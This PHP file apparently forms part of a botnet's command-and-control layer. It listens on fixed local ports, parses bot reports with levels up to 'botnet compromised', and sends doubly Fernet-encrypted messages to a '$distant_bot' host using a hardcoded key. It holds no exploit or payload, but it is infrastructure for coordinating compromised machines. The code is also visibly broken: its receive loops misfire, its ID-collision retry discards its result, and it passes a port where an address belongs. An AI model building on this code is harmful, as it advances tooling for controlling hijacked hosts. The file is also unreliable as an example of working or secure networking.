<?php
$icon = <<<ICON
█▀█ █▀█ ▀▀▀█ 
░▄▀ ░▄▀ ░░█░ 
█▄▄ █▄▄ ░▐▌░
ICON;

$mySqlPassword = "";
$mySqlUsername = "";
$mySqlTable = "";
$default_sending_port = 12009;
$default_receiving_port = 12010;

// List of subjects for sockets headers
$subjects = ["devices", "output", "failure", "botnet compromised"];
// Waiting line
$line =  [];

// Keeps track of the used ids for packet sending (see sendEncryptedData)
$used_ids = [];

// All logs levels
$levels = array(
    0 => "info",
    1 => "warning",
    2 => "error",
    3 => "failure",
    4 => "critical failure",
    5 => "botnet compromised"
);

// Socket header template
$socket_header = array(
    "subject" => "",
    "level" =>  0,
    "ip" => "",
    "group_id" => 0,
);

class connectionHandler extends Thread {
    private string $header = '';
    private string $body = '';
    private array $sampled_header = [];
    private array $sampled_body = [];
    public function __construct(private $connection_handler_socket, private $client_socket) {
    }

    public function run() {
        while ($this->header != null) {
            socket_recv($this->connection_handler_socket, $this->header, 1024, 0);
            array_push($this->sampled_header, $this->header);
            
            if ($this->header === "MESSAGE") {
                while ($this->sampled_body != null) {
                    socket_recv($this->connection_handler_socket, $this->body, 1024, 0);
                    array_push($this->sampled_body, $this->body);
                    $this->body = '';
                }
            }
            $this->header = "";
        }
        for ($i = 0; $i < count($this->sampled_header); $i++) {
            $this->header .= $this->sampled_header[$i];
        }
    }
    public function get_intels(): array {
        $subject = explode(' => ', $this->header)[1];
        $level = explode(' => ', $this->header)[3];
        $ip = explode(' => ', $this->header)[5];
        $group_id = explode(' => ',$this->header)[7];
        return [$subject, $level, $ip, $group_id];
    }

    public function isGarbage(): bool {
        return parent::isGarbage();
    }

}


// Got generateRandomString from stackoverflow
function generateRandomString($length = 40): string {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-&`';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}


function generateRandomId($length = 10): string {
    global $used_ids;
    $numbers = '0123456789';
    $numbers_length = strlen($numbers);
    $random_number = '';

    for ($i = 0; $i < $length; $i++) {
        $random_number .= $numbers[random_int(0, $numbers_length -1)];
    }
    
    for ($i = 0; $i < count($used_ids); $i ++) {
        if ($used_ids[$i] === $random_number) {
            generateRandomId();
        }
    }
    return $random_number;
}

function encryptPackage($header, $message): array {
    $message_key = generateRandomString();
    $header_key = 'cw_0x689RpI-jtRR7oE8h_eQsKImvJapLeSbXpwF4e4=';

    $header_fernet = MNC\Fernet::create($header_key);
    $encrypted_header = $header_fernet->encode($header . $message_key);

    $message_fernet = MNC\Fernet::create($message_key);
    $encrypted_message = $message_fernet->encode($header_fernet->encode($message));

    return [$encrypted_header, $encrypted_message];
}

function sendEncryptedData($encrypted_header, $encrypted_message, $distant_bot): void {
    global $default_sending_port;
    $id = generateRandomId();
    $encrypted_header = $encrypted_header . "IDENTIFIER" . $id;
    $encrypted_message = $encrypted_message . "IDENTIFIER" . $id;

    $header_socket = socket_create(AF_INET, SOCK_STREAM, 0);
    socket_connect($header_socket, $distant_bot, $default_sending_port);

    socket_sendto($header_socket, $encrypted_header, strlen($encrypted_header), 0, $default_sending_port);
    socket_close($header_socket);
    
    $message_socket = socket_create(AF_INET, SOCK_STREAM, 0);
    socket_connect($message_socket, $distant_bot, $default_sending_port);
    
    socket_sendto($message_socket, $encrypted_message, strlen($encrypted_message),0, $default_sending_port);
    socket_close($message_socket);
}

function getData(): array {
    // Create socket
    $socket = socket_create(AF_INET, SOCK_STREAM, 0);
    socket_bind($socket, '127.0.0.1', 12009);
    socket_listen($socket);

    // Receive data
    $client = socket_accept($socket);
    $header = socket_read($client, 2048);
    $message = socket_read($client, 8192);

    return [$header, $message];
}

function dataManagement(): bool {
    try {
        $data = getData();  
        return True;   

    } catch (Exception $e) {
        return False;
    }
}

function main_trash(): void {
    $isRunning = dataManagement();

    while ($isRunning) {
        $isRunning = dataManagement();
    }
}

function main(): void {
    global $default_receiving_port, $default_sending_port;
    while(True) {
        $handler_socket = socket_create(AF_INET, SOCK_STREAM, 0);
        socket_bind($handler_socket,'127.0.0.1',$default_receiving_port);
        socket_listen($handler_socket, 1);

        $client_socket = socket_accept($handler_socket);

        $connection_handler = new connectionHandler($handler_socket, $client_socket);
        $connection_handler->run();
    }
}

